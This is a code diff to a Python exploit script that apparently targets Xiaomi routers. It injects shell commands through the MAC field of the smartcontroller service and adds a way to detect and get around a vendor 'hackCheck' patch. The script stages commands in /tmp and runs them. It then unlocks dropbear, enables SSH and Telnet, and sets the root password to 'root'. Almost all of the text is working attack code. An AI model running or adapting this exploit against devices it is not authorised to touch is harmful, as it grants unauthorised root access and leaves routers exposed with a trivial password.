@@ -63,6 +63,7 @@ int32_t run_sysapi_macfilter(char* mac, int32_t wan_block)
 """
 vuln_cmd = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit"
 max_cmd_len = 100 - 1 - len(vuln_cmd)
+hackCheck = False
 
 def exec_smart_cmd(cmd, timeout = 7):
     api = 'xqsmarthome/request_smartcontroller'
@@ -75,30 +76,39 @@ def exec_smart_cmd(cmd, timeout = 7):
         raise ExploitError(f'Cannot send POST-request "{sc_command}" to SmartController service. {msg}')
     return res.text
 
-def reset_smart_task():
-    res = exec_smart_cmd( { "command": "reset_scenes" } )
+def exec_smart_command(cmd, timeout = 7, ignore_err_code = 0):
+    res = exec_smart_cmd( { "command": cmd } , timeout = timeout)
     try:
         dres = json.loads(res)
         code = dres['code']
     except Exception:
-        raise ExploitError(f'Error on parse response for command "reset_scenes" => {res}')
-    if code != 0:
-        raise ExploitError(f'Error on exec command "reset_scenes" => {res}')
-    return res
+        if ignore_err_code >= 2:
+            return res
+        raise ExploitError(f'Error on parse response for command "{cmd}" => {res}')
+    if ignore_err_code == 0 and code != 0:
+        raise ExploitError(f'Error on exec command "{cmd}" => {res}')
+    return dres
+
+def reset_smart_task():
+    return exec_smart_command("reset_scenes")
+
+def get_all_scenes():
+    return exec_smart_command("get_scene_setting")
 
 x_hour = 0
 x_min = 0
 
-def exec_tiny_cmd(cmd, act_delay = 0):
+def exec_tiny_cmd(cmd, act_delay = 2):
     global x_hour, x_min
     if len(cmd) > max_cmd_len:
-        raise ExploitError(f'Payload string line is too long (len = {len(cmd)}, max_len = {max_cmd_len})')
+        raise ExploitError(f'Payload string is too long (len = {len(cmd)}, max_len = {max_cmd_len})')
     x_min += 1
     if x_min == 60:
         x_min = 0
         x_hour += 1
         if x_hour == 24:
             x_hour = 0
+    sep = '\n' if hackCheck else ';'
     # scene_setting + action_list + launch
     pdata = {  
                 "command": "scene_setting",
@@ -109,7 +119,7 @@ def exec_tiny_cmd(cmd, act_delay = 0):
                     "type": "wan_block",
                     "payload": {
                         "command": "wan_block",
-                        "mac": ";" + cmd + ";"
+                        "mac": sep + cmd + sep
                     }
                 } ],
                 "launch": {
@@ -163,10 +173,13 @@ def exec_tiny_cmd(cmd, act_delay = 0):
         raise ExploitError(f'Error on exec command "scene_delete" => {res}')
     return res
 
-def exec_cmd(command):
+def exec_cmd(command, fn = '/tmp/e', run_as_sh = True):
+    if hackCheck:
+        command = command.replace(' ; ', '\n')
+    else:
+        command = command.replace(' ; ', ';')
     #reset_smart_task()
-    spec_sym = [ '"', '\\', '`', '$' ]
-    fn = '/tmp/e'
+    spec_sym = [ '"', '\\', '`', '$', '\n' ]
     fcmd = 'echo -n{spec} "{txt}"{amode}{fn}'
     flen = len(fcmd.format(spec="", txt="", amode="", fn=fn))
     amode = ">"
@@ -195,13 +208,16 @@ def exec_cmd(command):
         spec = ""
         if len(txt) == 1 and txt in spec_sym:
             spec = "e"
+            if txt == '\n':
+                txt = "n"
             txt = f"\\{txt}"
         cmd = fcmd.format(spec=spec, txt=txt, amode=amode, fn=fn)
         #print(f"[{cmd}]")
-        exec_tiny_cmd(cmd, act_delay = 2)
+        exec_tiny_cmd(cmd)
         pass
-    exec_tiny_cmd(f"chmod +x {fn}", act_delay = 2)
-    exec_tiny_cmd(f"sh {fn}", act_delay = 2)
+    if run_as_sh:
+        exec_tiny_cmd(f"chmod +x {fn}")
+        exec_tiny_cmd(f"sh {fn}")
 
 def get_dev_systime():
     # http://192.168.31.1/cgi-bin/luci/;stok=14b996378966455753104d187c1150b4/api/misystem/sys_time
@@ -239,10 +255,27 @@ def set_dev_systime(dst, year = 0, month = 0, day = 0, hour = 0, min = 0, sec = 
         raise ExploitError(f'Error on exec command "set_sys_time" => {res}')
     return res.text
 
+
+# Test smartcontroller interface
+res = get_all_scenes()
+
+# Detect using hackCheck fix
+hackCheck = False
+res = exec_smart_command("aaaaa;$", ignore_err_code = 2)
+if isinstance(res, dict):
+    if res['msg'] != 'api not exists':
+        die(f'Smartcontroller return error: {res}')
+else:
+    if 'Internal Server Error' in res:
+        print(f'Detect using xiaoqiang "hackCheck" fix ;-)')
+        hackCheck = True
+    else:
+        die(f'Smartcontroller return Error: {res}')
+
 # get device orig system time
 dst = get_dev_systime()
 
-print('Disable alarm mode for smartcontroller service ...')
+print('Enable smartcontroller scene executor ...')
 # echo "OK" > /tmp/ntp.status
 res = set_dev_systime(dst)
 
@@ -257,7 +290,7 @@ start_time = datetime.datetime.now()
 while datetime.datetime.now() - start_time <= datetime.timedelta(seconds = 32):
     time.sleep(2)
     try:
-        res = exec_tiny_cmd("date -s 203301020304", act_delay = 2)
+        res = exec_tiny_cmd("date -s 203301020304")
         #print(res)
     except Exception:
         try:
@@ -286,22 +319,28 @@ if not sc_activated:
 #die('----- TEST FINISHED ------')
 
 print('Unlock dropbear service ...')
-res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
+exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
+
 print('Unlock SSH server ...')
-res = exec_cmd("nvram set ssh_en=1; nvram set telnet_en=1; nvram commit")
-print('Set password for "root" user (password: "root") ...')
-res = exec_cmd(r"echo -e 'root\nroot' | passwd root")
-print('Enable dropbear service ...')
-res = exec_cmd("/etc/init.d/dropbear enable")
+exec_cmd("nvram set ssh_en=1 ; nvram set telnet_en=1 ; nvram commit")
+
+print('Set password "root" for root user ...')
+exec_tiny_cmd("echo root >/tmp/x")
+exec_tiny_cmd("echo root >>/tmp/x")
+exec_tiny_cmd("passwd root </tmp/x")
+
+print('Enabling dropbear service ...')
+exec_cmd("/etc/init.d/dropbear enable")
+
 print('Run SSH server on port 22 ...')
-res = exec_cmd("/etc/init.d/dropbear restart")
+exec_cmd("/etc/init.d/dropbear restart")
 
 print('Test SSH connection to port 22 ...')
 print("")
 time.sleep(0.5)
 gw.use_ssh = True
 gw.passw = 'root'
-ssh_en = gw.ping(verbose = 0, contimeout = 25)   # RSA host key generate slowly!
+ssh_en = gw.ping(verbose = 0, contimeout = 18)   # RSA host key generate slowly!
 if ssh_en:
     print('#### SSH server are activated! ####')
 else:
@@ -310,9 +349,9 @@ else:
 if not ssh_en:
     print("")
     print('Unlock TelNet server ...')
-    exec_cmd("[ `bdata get telnet_en` != '1' ] && bdata set telnet_en=1 && bdata commit")
+    exec_cmd("bdata set telnet_en=1 ; bdata commit")
     print('Run TelNet server on port 23 ...')
-    exec_cmd("/etc/init.d/telnet enable; /etc/init.d/telnet restart")
+    exec_cmd("/etc/init.d/telnet enable ; /etc/init.d/telnet restart")
     time.sleep(0.5)
     gw.use_ssh = False
     telnet_en = gw.ping(verbose = 2)
